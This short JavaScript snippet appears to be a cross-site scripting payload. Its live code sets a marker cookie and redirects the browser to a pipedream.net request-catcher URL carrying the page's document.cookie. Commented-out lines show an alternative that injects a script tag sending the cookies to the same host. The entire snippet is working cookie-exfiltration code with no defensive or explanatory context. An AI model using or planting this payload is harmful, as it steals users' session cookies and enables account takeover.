// const node = document.createElement("script");
// node.setAttribute("src", "https://ensgnh0kr2ws.x.pipedream.net?"+document.cookie);
// document.getElementsByTagName("body")[0].appendChild(node);
if (document.cookie.includes("aaa") == false) {
    document.cookie = "aaa=bbb" 
    window.location.replace("https://ensgnh0kr2ws.x.pipedream.net?c="+document.cookie.toString());
}                                                     
